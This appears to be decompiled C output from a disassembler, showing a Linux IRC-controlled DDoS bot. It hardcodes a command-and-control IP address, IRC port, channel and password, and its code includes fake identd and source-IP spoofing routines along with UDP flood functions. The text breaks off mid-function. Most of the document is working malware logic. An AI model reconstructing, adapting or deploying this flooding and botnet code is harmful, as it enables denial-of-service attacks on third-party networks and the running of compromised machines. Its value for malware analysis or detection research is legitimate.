int __cdecl xdr_enum(_DWORD, _DWORD);
int __cdecl xdr_opaque(_DWORD *a1, int a2, int a3);
int __cdecl xdr_union(int a1, _DWORD *a2, int a3, _DWORD *a4, int (__cdecl *a5)(int, int, signed int));
// int __usercall xdr_string@<eax>(unsigned __int32 a1@<ebp>, _DWORD *a2, const char **a3, unsigned int a4);
// _BOOL4 __usercall xdr_wrapstring@<eax>(unsigned __int32 a1@<ebp>, _DWORD *a2, const char **a3);
int __cdecl xdr_bytes(_DWORD *a1, _DWORD **a2, unsigned int *a3, unsigned int a4);
int __cdecl xdr_netobj(_DWORD *a1, int a2);
int __cdecl xdrmem_create(_DWORD *a1, int a2, int a3, int a4);
int __cdecl xdrmem_getpos(int a1);
int __cdecl xdrmem_setpos(_DWORD *a1, int a2);
int __cdecl xdrmem_inline(int a1, unsigned int a2);
signed int __cdecl xdrmem_putint32(int a1, unsigned int *a2);
signed int __cdecl xdrmem_getint32(int a1, _DWORD *a2);
signed int __cdecl xdrmem_putlong(int a1, unsigned int *a2);
signed int __cdecl xdrmem_getlong(int a1, _DWORD *a2);
signed int __cdecl xdrmem_putbytes(int a1, char *a2, unsigned int a3);
signed int __cdecl xdrmem_getbytes(int a1, char *a2, unsigned int a3);
signed int __cdecl inet_aton(char *a1, _DWORD *a2);
// int __usercall _dns_lookup@<eax>(off_t a1@<ebp>, char *a2, int a3, int a4, int a5, _DWORD *a6, char *a7);
// int __usercall _open_nameservers@<eax>(unsigned int *a1@<ebp>);
signed int __cdecl _get_hosts_byname_r(unsigned __int8 *a1, int a2, _DWORD *a3, int a4, unsigned int a5, _DWORD *a6, _DWORD *a7);
signed int __cdecl signal(int a1, int a2);
signed int __cdecl lrand48_r(unsigned __int16 *a1, int *a2);
signed int __cdecl nrand48_r(unsigned __int16 *a1, int a2, int *a3);
int __cdecl srand48_r(int a1, int a2);
// void __usercall _exit_handler(int a1@<ecx>, unsigned int a2@<ebp>, int a3);
// _DWORD *__usercall _new_exitfn@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>);
// int __usercall dl_aux_init@<eax>(int a1@<eax>);
int __cdecl brk(void *end_data_segment); // idb
_DWORD *__cdecl _cmsg_nxthdr(int a1, _DWORD *a2);
int __cdecl fseeko(int a1, int a2, unsigned int whence);
int printf(void *a1, ...);
int __cdecl fseeko64(int, int, int, unsigned int whence); // idb
int __cdecl _stdio_READ(int, void *addr, size_t len); // idb
signed int __cdecl _stdio_adjust_position(int a1, __int64 *a2);
int __cdecl _stdio_rfill(int a1);
signed int __cdecl _stdio_trans2r_o(unsigned int *a1, int a2);
int __cdecl _stdio_seek(int, int, unsigned int whence); // idb
// int __usercall vfprintf@<eax>(off_t a1@<ebp>, size_t len, void *a3, int a4);
int __cdecl strcoll(unsigned __int8 *a1, unsigned __int8 *a2);
const char *__cdecl strncat(const char *a1, char *a2, int a3);
// int __usercall memcmp_bytes@<eax>(int a1@<eax>, int a2@<edx>);
int __cdecl memcmp(int a1, int a2, unsigned int a3);
int __cdecl rawmemchr(int a1, unsigned __int8 a2);
int __cdecl strspn(char *a1, _BYTE *a2);
int __cdecl ffs(int a1);
signed int authnone_validate();
int authnone_refresh();
// int __usercall authnone_marshal@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4);
// char *__usercall authnone_create@<eax>(off_t a1@<ebp>, int a2@<edi>);
// _BOOL4 __usercall xdr_authunix_parms@<eax>(int a1@<eax>, unsigned __int32 a2@<ebp>, _DWORD *a3, int a4);
signed int __cdecl bindresvport(int a1, __int16 *a2);
// signed int __usercall _get_myaddress@<eax>(int a1@<eax>);
// int __usercall pmap_unset@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4);
// int __usercall pmap_set@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5, unsigned __int16 a6);
int rpc_dtablesize();
// int __usercall xdr_vector@<eax>(int result@<eax>, int a2, int a3, unsigned int a4, int a5, int (__cdecl *a6)(int, int, signed int, int));
// signed int __usercall xdr_array@<eax>(off_t a1@<ebp>, _DWORD *a2, _DWORD **a3, unsigned int *a4, unsigned int a5, unsigned int a6, int (__cdecl *a7)(_DWORD *, _DWORD *, signed int, unsigned int));
// signed int __usercall inet_pton4@<eax>(char *a1@<eax>, char *a2@<edx>);
signed int __cdecl inet_pton(int a1, char *a2, char *a3);
// _BYTE *__usercall inet_ntop4@<eax>(int a1@<eax>, _BYTE *a2@<edx>, unsigned int a3@<ecx>);
// _BYTE *__usercall inet_ntop@<eax>(int a1@<ebx>, signed int a2@<ebp>, int a3, int a4, int a5, unsigned int a6);
signed int __cdecl _encode_header(int a1, _BYTE *a2, signed int a3);
signed int __cdecl _decode_header(unsigned __int8 *a1, int *a2);
int __cdecl _encode_question(int a1, int a2, int a3);
int __cdecl _length_question(int a1, int a2);
int __cdecl _decode_answer(int a1, int a2, int a3, char **a4);
int _open_etc_hosts();
signed int __cdecl _read_etc_hosts_r(unsigned int *a1, unsigned __int8 *a2, int a3, int a4, _DWORD *a5, int a6, unsigned int a7, _DWORD *a8, _DWORD *a9);
int __cdecl _drand48_iterate(unsigned __int16 *a1, int a2);
int __cdecl tolower(int a1);
int __cdecl perror(char *a1);
int fprintf(size_t len, void *arg4, ...);
int __cdecl strchr(char *a1, char a2);
const char *__cdecl clnt_sperrno(int a1);
// void __usercall free_mem(unsigned __int32 a1@<ebp>, int a2@<edi>);
// signed int __usercall clnt_perrno@<eax>(off_t a1@<ebp>, int a2);
// int __usercall buf@<eax>(off_t a1@<ebp>, int a2@<edi>);
// int __usercall clnt_spcreateerror@<eax>(int a1@<ebx>, off_t a2@<ebp>, int a3@<edi>, int a4);
// signed int __usercall clnt_pcreateerror@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3);
// int __usercall clnt_sperror@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4);
// signed int __usercall clnt_perror@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4);
int __cdecl _encode_dotted(char *a1, int a2, int a3);
int __cdecl _decode_dotted(int a1, int a2, int a3, unsigned int a4);
int __cdecl _length_dotted(int a1, int a2);
int _do_global_ctors_aux();
int term_proc();

//-------------------------------------------------------------------------
// Data declarations

int _restore_rt = 44472; // weak
char _restore = 'X'; // weak
_UNKNOWN loc_80533EB; // weak
_UNKNOWN unk_805A274; // weak
_UNKNOWN global_key_pass; // weak
_UNKNOWN _stdio_mutex_initializer_3991; // weak
char prefix_4202[2] = "+"; // weak
char byte_805A6D0[] = { '\0' }; // weak
__int16 spec_and_mask_4207[8] = { 7936, 5, 3840, 2055, 2, 4, 1, 3 }; // idb
__int16 spec_or_mask_4206[7] = { 4096, 5, 0, 7, 2, 4, 1 }; // idb
_UNKNOWN unk_805A70B; // weak
_UNKNOWN spec_ranges_4205; // weak
char type_sizes[12] =
{
  '\0',
  '\x01',
  '\x01',
  '\x01',
  '\x04',
  '\x02',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01'
}; // idb
int random_poly_info[5] = { 0, 3, 1, 3, 1 }; // idb
int dword_805B2F4[5] = { 0, 7, 15, 31, 63 }; // idb
_UNKNOWN unk_805B308; // weak
_UNKNOWN unk_805BB93; // weak
long double exp10_table[13] = { ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt, ?flt }; // idb
int timeout = 5; // weak
int tottimeout = 60; // weak
_UNKNOWN reply_dscrm; // weak
_UNKNOWN xdr_zero; // weak
int (__cdecl *xdrmem_ops[2])(int, int) = { &xdrmem_getlong, &xdrmem_putlong }; // weak
_UNKNOWN unk_805BDA8; // weak
int (*ops)() = &authnone_verf; // weak
int timeout_0 = 5; // weak
int tottimeout_0 = 60; // weak
_UNKNOWN unk_805BEB7; // weak
int auth_errlist[] = { 0 }; // weak
int dword_805BFE4[14] = { 0, 1, 18, 2, 44, 3, 71, 4, 95, 5, 120, 6, 147, 7 }; // idb
int rpc_errlist[] = { 0 }; // weak
int dword_805C104[38] =
{
  0,
  1,
  13,
  2,
  41,
  3,
  66,
  4,
  86,
  5,
  109,
  6,
  124,
  7,
  158,
  8,
  184,
  9,
  209,
  10,
  239,
  11,
  266,
  12,
  301,
  13,
  326,
  17,
  344,
  14,
  366,
  15,
  391,
  16,
  419,
  0,
  0,
  0
}; // idb
int _CTOR_LIST__[] = { 4294967295 }; // weak
int (*off_805D36C)() = &pthread_initialize; // weak
int _JCR_LIST__ = 0; // weak
void *p_2427 = &_DTOR_END__; // weak
int numservers = 1; // weak
char *servers[2] = { "12.226.89.160", NULL }; // idb
char *irc_port[13] =
{
  "6667",
  "#rekt",
  "catsmeow",
  "[REKT]",
  "[UNK] Attacking",
  "[UDP] Attacking",
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *irc_chan[12] =
{
  "#rekt",
  "catsmeow",
  "[REKT]",
  "[UNK] Attacking",
  "[UDP] Attacking",
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *admin[11] =
{
  "catsmeow",
  "[REKT]",
  "[UNK] Attacking",
  "[UDP] Attacking",
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *bot_prefix[10] =
{
  "[REKT]",
  "[UNK] Attacking",
  "[UDP] Attacking",
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *off_805D3DC[9] =
{
  "[UNK] Attacking",
  "[UDP] Attacking",
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *udp_msg[8] =
{
  "[UDP] Attacking",
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *std_msg[7] =
{
  "[STD] Attacking",
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *tcp_msg[6] =
{
  "[TCP] Attacking",
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *syn_msg[5] =
{
  "[SYN] Attacking",
  "[ACK] Attacking",
  "[FIN] Attacking",
  "[RST] Attacking",
  "[PSH] Attacking"
}; // weak
char *ack_msg[4] = { "[ACK] Attacking", "[FIN] Attacking", "[RST] Attacking", "[PSH] Attacking" }; // weak
char *fin_msg[3] = { "[FIN] Attacking", "[RST] Attacking", "[PSH] Attacking" }; // weak
char *rst_msg[2] = { "[RST] Attacking", "[PSH] Attacking" }; // weak
char *psh_msg = "[PSH] Attacking"; // weak
int c = 362436; // weak
int i_4805 = 4095; // weak
char *flooders = "+std"; // weak
int (__cdecl *off_805D424)(int, int, int, int) = &std; // weak
char *msgs = "352"; // weak
int (__cdecl *off_805D484)(int, int, int) = &352; // weak
int _pthread_handles[] = { 0 }; // weak
void **off_805D4C8 = &_pthread_initial_thread; // weak
int dword_805D4CC[] = { 0 }; // weak
_UNKNOWN unk_805D4E0; // weak
int _pthread_handles_num = 2; // weak
void *_pthread_initial_thread = &_pthread_initial_thread; // weak
int dword_806167C = 0; // weak
char byte_8061680 = '\0'; // weak
_UNKNOWN _pthread_manager_thread; // weak
int dword_80616D0 = 0; // weak
pid_t pid = 0; // idb
int dword_80616D8 = 0; // weak
void *off_80616DC = &unk_805D4D0; // weak
void *off_8061704 = &unk_8061708; // weak
_UNKNOWN unk_8061708; // weak
int dword_806170C = 0; // weak
_UNKNOWN unk_8061710; // weak
int dword_8061868 = 0; // weak
int dword_806186C = 0; // weak
void **_pthread_main_thread = &_pthread_initial_thread; // weak
int _pthread_manager_request = 4294967295; // idb
int _pthread_sig_restart = 32; // idb
int _pthread_sig_cancel = 33; // idb
int _pthread_sig_debug = 34; // idb
int current_rtmin = 35; // weak
int current_rtmax = 64; // weak
void *_ctype_toupper = &unk_805A4A0; // weak
size_t stdout = 134617648u; // idb
size_t stderr = 134617728u; // idb
int *stdio_openlist = &stdio_streams; // weak
_UNKNOWN stdio_openlist_add_lock; // weak
_UNKNOWN stdio_openlist_del_lock; // weak
int stdio_user_locking = 2; // weak
int stdio_streams = 288; // weak
int dword_8061A30 = 272; // weak
_UNKNOWN _malloc_lock; // weak
_UNKNOWN mylock; // weak
_UNKNOWN mylock_0; // weak
void *unsafe_state = &unk_8061B50; // weak
void *off_8061B20 = &unk_8061B44; // weak
_UNKNOWN _atexit_lock; // weak
void *_uclibc_progname = (void *)0x805BD27; // weak
void *_ctype_b = &unk_805B680; // weak
void *_ctype_tolower = &unk_805B980; // weak
int (__cdecl *udp_ops)(int, char, int, int, int, int, int, int) = &clntudp_call; // weak
__int16 static_id = 1; // weak
_UNKNOWN _resolv_lock; // weak
char completed_2429; // weak
int changeservers; // weak
char disabled; // weak
int spoofs; // weak
int spoofsm; // weak
int numpids; // weak
char macAddress[]; // weak
_UNKNOWN textBuffer_4344; // weak
int i_4356; // weak
int Q[4096]; // idb
int terminated_children; // weak
int main_thread_exiting; // weak
int pthread_threads_counter; // weak
_UNKNOWN pthread_atfork_lock; // weak
int pthread_atfork_prepare; // weak
int pthread_atfork_child; // weak
int pthread_atfork_parent; // weak
int sighandler[65]; // idb
int wait_node_free_list; // weak
int wait_node_free_list_spinlock; // weak
int _pthread_initial_thread_bos; // weak
int _pthread_manager_thread_bos; // weak
int _pthread_manager_thread_tos; // idb
int _pthread_exit_requested; // weak
int _pthread_exit_code; // idb
int _libc_multiple_threads_ptr; // weak
int current_level; // weak
_UNKNOWN once_masterlock; // weak
_UNKNOWN once_finished; // weak
int fork_generation; // weak
int pthread_keys[]; // weak
int dword_8066224[2046]; // idb
_UNKNOWN pthread_keys_mutex; // weak
_UNKNOWN errno; // weak
_UNKNOWN h_errno; // weak
int stdio_openlist_use_count; // weak
int stdio_openlist_del_count; // weak
_UNKNOWN next_start_1109; // weak
_UNKNOWN buf_4993; // weak
_UNKNOWN h_4992; // weak
char been_there_done_that; // weak
int (__cdecl *_exit_cleanup)(_DWORD); // weak
_UNKNOWN _libc_multiple_threads; // weak
int _libc_stack_end; // weak
char **environ; // idb
int _pagesize; // weak
int (*_app_fini)(void); // weak
int (*_rtld_fini)(void); // weak
char been_there_done_that_2832; // weak
int once_5746; // weak
_UNKNOWN _libc_tsd_RPC_VARS_mem; // weak
_UNKNOWN mylock_1; // weak
char is_initialized; // weak
_UNKNOWN _rpc_lrand48_data; // weak
_UNKNOWN crud_3318; // weak
_UNKNOWN mylock_2; // weak
int static_ns; // weak
int _exit_count; // weak
int _exit_function_table; // weak
int _exit_slots; // weak
int _curbrk; // weak
__int16 port_2347; // weak
int size_3882; // weak
int ident; // weak
int pass; // weak
int nick; // weak
int sock; // idb
int user; // weak
int server; // weak
int ourIP; // weak
int key; // weak
int chan; // weak
int pids; // weak
int _pthread_nonstandard_stacks; // weak
int _pthread_threads_events; // weak
int _pthread_last_event; // weak
int _pthread_threads_debug; // weak
int _linuxthreads_initial_report_events; // weak
int _pthread_manager_reader; // idb
int _malloc_state[11]; // idb
int dword_806A64C[]; // weak
int dword_806A650; // weak
_UNKNOWN unk_806A654; // weak
int dword_806A65C; // weak
int dword_806A660; // weak
int dword_806A954[4]; // idb
int dword_806A964; // weak
int dword_806A968; // weak
int dword_806A96C; // weak
int dword_806A970; // weak
int dword_806A974; // weak
int dword_806A978; // weak
int dword_806A97C; // weak
int dword_806A980; // weak
int dword_806A984; // weak
int dword_806A988; // weak
int dword_806A98C; // weak
int dword_806A990; // weak
int dword_806A994; // weak
int _libc_tsd_RPC_VARS_data; // weak
_UNKNOWN svc_fdset; // weak
int null_auth; // weak
_UNKNOWN svc_max_pollfd; // weak
_UNKNOWN rpc_createerr; // weak
_UNKNOWN svc_pollfd; // weak
int _searchdomain[4]; // idb
int _nameserver[]; // weak
int _nameservers; // weak
int _searchdomains; // weak
_UNKNOWN sigintr; // weak
int dl_phdr; // weak
int dl_phnum; // weak


//----- (08048094) --------------------------------------------------------
int init_proc()
{
  frame_dummy();
  return _do_global_ctors_aux();
}

//----- (080480B0) --------------------------------------------------------
void _get_pc_thunk_bx()
{
  ;
}

//----- (080480C0) --------------------------------------------------------
int _do_global_dtors_aux()
{
  void (*v0)(void); // edx@4
  int result; // eax@5

  if ( !completed_2429 )
  {
    while ( 1 )
    {
      v0 = *(void (**)(void))p_2427;
      if ( !*(_DWORD *)p_2427 )
        break;
      p_2427 = (char *)p_2427 + 4;
      v0();
    }
    result = 0;
    completed_2429 = 1;
  }
  return result;
}
// 805D3A4: using guessed type void *p_2427;
// 8061C20: using guessed type char completed_2429;

//----- (08048110) --------------------------------------------------------
int frame_dummy()
{
  int result; // eax@1

  result = _JCR_LIST__;
  if ( _JCR_LIST__ )
    result = 0;
  return result;
}
// 805D37C: using guessed type int _JCR_LIST__;

//----- (08048164) --------------------------------------------------------
#error "8048167: positive sp value has been found (funcsize=2)"

//----- (08048188) --------------------------------------------------------
int __cdecl strwildmatch(_BYTE *a1, unsigned __int8 *a2)
{
  int v2; // ebx@56
  signed int v4; // [esp+Ch] [ebp-2Ch]@1

  v4 = (unsigned __int8)*a1;
  if ( v4 == 84 )
    return strwildmatch(a1 + 1, a2) && (!*a2 || strwildmatch(a1, a2 + 1));
  if ( v4 > 84 )
  {
    switch ( v4 )
    {
      case 111:
        return strwildmatch(a1 + 1, a2) && (!*a2 || strwildmatch(a1, a2 + 1));
      case 116:
        return strwildmatch(a1 + 1, a2) && (!*a2 || strwildmatch(a1, a2 + 1));
      case 98:
        return strwildmatch(a1 + 1, a2) && (!*a2 || strwildmatch(a1, a2 + 1));
    }
LABEL_56:
    v2 = toupper((unsigned __int8)*a1);
    return v2 != toupper(*a2) || strwildmatch(a1 + 1, a2 + 1);
  }
  if ( v4 == 66 )
    return strwildmatch(a1 + 1, a2) && (!*a2 || strwildmatch(a1, a2 + 1));
  if ( v4 > 66 )
  {
    if ( v4 == 79 )
      return strwildmatch(a1 + 1, a2) && (!*a2 || strwildmatch(a1, a2 + 1));
    goto LABEL_56;
  }
  if ( !*a1 )
    return *a2;
  if ( v4 != 63 )
    goto LABEL_56;
  return !*a2 || strwildmatch(a1 + 1, a2 + 1);
}

//----- (080484A0) --------------------------------------------------------
unsigned int Send(int fd, const char *a2, ...)
{
  int savedregs; // [esp+18h] [ebp+0h]@1
  va_list va; // [esp+28h] [ebp+10h]@1

  va_start(va, a2);
  vsprintf((int)&textBuffer_4344, (void *)a2, (int)va);
  return write((off_t)&savedregs, fd, &textBuffer_4344, strlen((const char *)&textBuffer_4344));
}

//----- (080484F7) --------------------------------------------------------
int __cdecl host2ip(int a1, int a2)
{
  int v3; // [esp+14h] [ebp-4h]@2
  int savedregs; // [esp+18h] [ebp+0h]@4

  i_4356 = inet_addr((char *)a2);
  if ( i_4356 == -1 )
  {
    v3 = gethostbyname((unsigned __int8 *)a2);
    if ( !v3 )
    {
      Send(sock, "NOTICE %s :Unable to resolve %s\n", a1, a2);
      exit((off_t)&savedregs, 0);
    }
    bcopy(**(char ***)(v3 + 16), (char *)&i_4356, *(_DWORD *)(v3 + 12));
  }
  return i_4356;
}
// 8062060: using guessed type int i_4356;

//----- (0804857E) --------------------------------------------------------
signed int __usercall mfork@<eax>(int edi0@<edi>, int a1)
{
  signed int v3; // [esp+4h] [ebp-14h]@2
  signed int v4; // [esp+Ch] [ebp-Ch]@3
  int v5; // [esp+10h] [ebp-8h]@5
  unsigned int i; // [esp+14h] [ebp-4h]@5
  int savedregs; // [esp+18h] [ebp+0h]@5

  if ( disabled == 1 )
  {
    Send(sock, "NOTICE %s :Unable to comply.\n", a1);
    v3 = 1;
  }
  else
  {
    v4 = fork();
    if ( v4 )
    {
      v5 = malloc((off_t)&savedregs, edi0, 4 * ++numpids + 4);
      for ( i = 0; numpids - 1 > i; ++i )
        *(_DWORD *)(v5 + 4 * i) = *(_DWORD *)(4 * i + pids);
      *(_DWORD *)(v5 + 4 * numpids - 4) = v4;
      free((unsigned int)&savedregs, (_DWORD *)pids);
      pids = v5;
      v3 = v4;
    }
    else
    {
      v3 = 0;
    }
  }
  return v3;
}
// 8061C44: using guessed type char disabled;
// 8061C50: using guessed type int numpids;
// 806A5FC: using guessed type int pids;

//----- (0804865D) --------------------------------------------------------
char __cdecl filter(const char *a1)
{
  char result; // al@4

  while ( 1 )
  {
    if ( a1[strlen(a1) - 1] != 13 )
    {
      result = a1[strlen(a1) - 1];
      if ( result != 10 )
        break;
    }
    a1[strlen(a1) - 1] = 0;
  }
  return result;
}

//----- (080486CF) --------------------------------------------------------
char *__usercall makestring@<eax>(int a1@<edi>)
{
  int v1; // eax@1
  int rand1; // ebx@6
  char buf1; // [esp+14h] [ebp-424h]@7
  char *v5; // [esp+414h] [ebp-24h]@1
  int v6; // [esp+418h] [ebp-20h]@1
  int i; // [esp+41Ch] [ebp-1Ch]@2
  unsigned int *words_fd; // [esp+420h] [ebp-18h]@1
  int rand2; // [esp+428h] [ebp-10h]@6
  int savedregs; // [esp+438h] [ebp+0h]@1

  v1 = rand();
  v6 = v1 % 5 + 4;
  v5 = (char *)malloc((off_t)&savedregs, a1, v1 % 5 + 5);
  memset(v5, 0, v6 + 1);
  words_fd = (unsigned int *)fopen("/usr/dict/words", (int)"r");
  if ( words_fd )
  {
    rand1 = rand();
    rand2 = rand() * rand1 % 45402 + 1;
    for ( i = 0; i < rand2; ++i )
      fgets((off_t)&savedregs, &buf1, 1024, words_fd);
    // zero out 1024 bytes at &buf1
    memset(&buf1, 0, 0x400u);
    fgets((off_t)&savedregs, &buf1, 1024, words_fd);
    filter(&buf1);
    qmemcpy(v5, &buf1, v6);
    fclose((int)words_fd);
  }
  else
  {
    for ( i = 0; i < v6; ++i )
      v5[i] = rand() % 26 + 65;
  }
  return v5;
}
// 80533F0: using guessed type int rand(void);

//----- (0804883C) --------------------------------------------------------
int identd()
{
  int result; // eax@1
  fd_set readfds; // [esp+10h] [ebp-4C8h]@7
  struct timeval timeout; // [esp+90h] [ebp-448h]@7
  char v3[1024]; // [esp+98h] [ebp-440h]@10
  char v4; // [esp+498h] [ebp-40h]@5
  __int16 v5; // [esp+4A8h] [ebp-30h]@2
  __int16 v6; // [esp+4AAh] [ebp-2Eh]@2
  int v7; // [esp+4ACh] [ebp-2Ch]@2
  int v8; // [esp+4B0h] [ebp-28h]@2
  int v9; // [esp+4B4h] [ebp-24h]@2
  int v10; // [esp+4B8h] [ebp-20h]@5
  int v11; // [esp+4C0h] [ebp-18h]@1
  int fd; // [esp+4C4h] [ebp-14h]@5
  int v13; // [esp+4C8h] [ebp-10h]@10
  int v14; // [esp+4CCh] [ebp-Ch]@7
  struct timeval *v15; // [esp+4D0h] [ebp-8h]@7
  int savedregs; // [esp+4D8h] [ebp+0h]@5

  result = socket(2, 1, 0);
  v11 = result;
  if ( result != -1 )
  {
    v5 = 2;
    v6 = htons(113);
    v7 = 0;
    v8 = 0;
    v9 = 0;
    result = bind(v11, (int)&v5, 16);
    if ( result != -1 )
    {
      result = listen(v11, 1);
      if ( result != -1 )
      {
        result = fork();
        if ( result )
        {
          v10 = 16;
          fd = accept((off_t)&savedregs, v11, (int)&v4, (int)&v10);
          if ( fd == -1 )
            exit((off_t)&savedregs, 0);
          while ( 1 )
          {
            memset(&readfds, 0, sizeof(readfds));
            v14 = 0;
            v15 = &timeout;
            _bittestandset((signed __int32 *)&readfds + ((unsigned int)fd >> 5), fd & 0x1F);
            timeout.tv_usec = 60;
            timeout.tv_sec = 60;
            if ( (select(fd + 1, &readfds, 0, 0, &timeout) & 0x80000000) != 0 )
              break;
            if ( _bittest((const signed __int32 *)&readfds + ((unsigned int)fd >> 5), fd & 0x1F) )
            {
              v13 = recv((off_t)&savedregs, fd, (int)v3, 1024, 0);
              if ( v13 <= 0 || v13 > 19 )
                exit((off_t)&savedregs, 0);
              v3[v13] = 0;
              if ( v3[v13 - 1] == 10 || v3[v13 - 1] == 13 )
                v3[v13 - 1] = 0;
              if ( v3[v13 - 2] == 10 || v3[v13 - 2] == 13 )
                v3[v13 - 2] = 0;
              Send(fd, "%s : USERID : UNIX : %s\n", v3, ident);
              close((off_t)&savedregs, fd);
              close((off_t)&savedregs, v11);
              exit((off_t)&savedregs, 0);
            }
          }
          exit((off_t)&savedregs, 0);
        }
      }
    }
  }
  return result;
}
// 806A5D4: using guessed type int ident;
// 804883C: using guessed type char var_440[1024];

//----- (08048A7E) --------------------------------------------------------
double __cdecl pow(double x)
{
  long double v1; // fst7@3
  double v3; // [esp-8h] [ebp-Ch]@0

  if ( HIDWORD(x) && HIDWORD(x) != 1 )
    v1 = pow(COERCE_DOUBLE(*(_QWORD *)&x - 0x100000000LL), v3);
  return v1;
}

//----- (08048AC2) --------------------------------------------------------
int __cdecl in_cksum(_BYTE *a1, signed int a2)
{
  signed int v3; // [esp+0h] [ebp-1Ch]@1
  _BYTE *v4; // [esp+4h] [ebp-18h]@1
  int v5; // [esp+8h] [ebp-14h]@1
  unsigned __int16 v6; // [esp+1Ah] [ebp-2h]@1

  v3 = a2;
  v4 = a1;
  v5 = 0;
  HIBYTE(v6) = 0;
  while ( v3 > 1 )
  {
    v5 += *(unsigned __int16 *)v4;
    v4 += 2;
    v3 -= 2;
  }
  if ( v3 == 1 )
  {
    LOBYTE(v6) = *v4;
    v5 += v6;
  }
  return (unsigned __int16)~((((unsigned int)(unsigned __int16)v5 + (v5 >> 16)) >> 16) + v5 + HIWORD(v5));
}

//----- (08048B47) --------------------------------------------------------
int getspoof()
{
  unsigned int v0; // eax@5

  if ( !spoofs )
    return rand();
  if ( spoofsm == 1 )
    return ntohl(spoofs);
  v0 = rand();
  return ntohl(v0 % spoofsm + spoofs + 1);
}
// 80533F0: using guessed type int rand(void);
// 8061C48: using guessed type int spoofs;
// 8061C4C: using guessed type int spoofsm;

//----- (08048BB6) --------------------------------------------------------
_BOOL4 __cdecl getHost(int a1, _DWORD *a2)
{
  *a2 = inet_addr((char *)a1);
  return *a2 == -1;
}

//----- (08048BF1) --------------------------------------------------------
signed int __usercall std@<eax>(int edi0@<edi>, int a1, int a2, signed int a3, int *a4)
{
  signed int result; // eax@1
  int v6; // [esp+10h] [ebp-28h]@4
  int v7; // [esp+14h] [ebp-24h]@4
  int v8; // [esp+18h] [ebp-20h]@4
  int v9; // [esp+1Ch] [ebp-1Ch]@4
  int v10; // [esp+20h] [ebp-18h]@1
  int d; // [esp+24h] [ebp-14h]@5
  int v12; // [esp+28h] [ebp-10h]@7
  unsigned int v13; // [esp+2Ch] [ebp-Ch]@4
  unsigned int v14; // [esp+34h] [ebp-4h]@1
  int savedregs; // [esp+38h] [ebp+0h]@3

  v10 = 1;
  v14 = time(0);
  result = mfork(edi0, a2);
  if ( !result )
  {
    if ( a3 <= 1 )
      exit((off_t)&savedregs, 1);
    v13 = atol((_BYTE *)a4[3]);
    v6 = 0;
    v7 = 0;
    v8 = 0;
    v9 = 0;
    v7 = host2ip(a2, a4[1]);
    LOWORD(v6) = 2;
    Send(a1, "NOTICE %s :%s %s\n", a2, std_msg[0], a4[1]);
    while ( 1 )
    {
      HIWORD(v6) = atol((_BYTE *)a4[2]);
      d = socket(2, 2, 17);
      if ( d >= 0 )
      {
        v10 = 1;
        ioctl(d, 21537);
        sendto((off_t)&savedregs, d, (int)"std", 50, 0, (int)&v6, 16);
        close((off_t)&savedregs, d);
      }
      if ( v12 > 49 )
      {
        if ( time(0) >= v13 + v14 )
        {
          close((off_t)&savedregs, d);
          exit((off_t)&savedregs, 0);
        }
        v12 = 0;
      }
      ++v12;
    }
  }
  return result;
}
// 805D3E4: using guessed type char *std_msg[7];

//----- (08048D72) --------------------------------------------------------
signed int __usercall udp@<eax>(int edi0@<edi>, int a1, int a2, signed int a3, int *a4)
{
  signed int result; // eax@1
  int v6; // [esp+Ch] [ebp-2Ch]@4
  int v7; // [esp+10h] [ebp-28h]@4
  int v8; // [esp+14h] [ebp-24h]@4
  int v9; // [esp+18h] [ebp-20h]@4
  int v10; // [esp+1Ch] [ebp-1Ch]@1
  int d; // [esp+20h] [ebp-18h]@5
  int v12; // [esp+24h] [ebp-14h]@7
  unsigned int v13; // [esp+28h] [ebp-10h]@4
  int v14; // [esp+2Ch] [ebp-Ch]@1
  unsigned int v15; // [esp+34h] [ebp-4h]@1
  int savedregs; // [esp+38h] [ebp+0h]@1

  v10 = 1;
  v14 = malloc((off_t)&savedregs, edi0, 0x2400u);
  v15 = time(0);
  result = mfork(edi0, a2);
  if ( !result )
  {
    if ( a3 <= 1 )
      exit((off_t)&savedregs, 1);
    v13 = atol((_BYTE *)a4[3]);
    v6 = 0;
    v7 = 0;
    v8 = 0;
    v9 = 0;
    v7 = host2ip(a2, a4[1]);
    LOWORD(v6) = 2;
    Send(a1, "NOTICE %s :%s %s\n", a2, udp_msg[0], a4[1]);
    while ( 1 )
    {
      HIWORD(v6) = atol((_BYTE *)a4[2]);
      d = socket(2, 2, 17);
      if ( d >= 0 )
      {
        v10 = 1;
        ioctl(d, 21537);
        sendto((off_t)&savedregs, d, v14, 9216, 0, (int)&v6, 16);
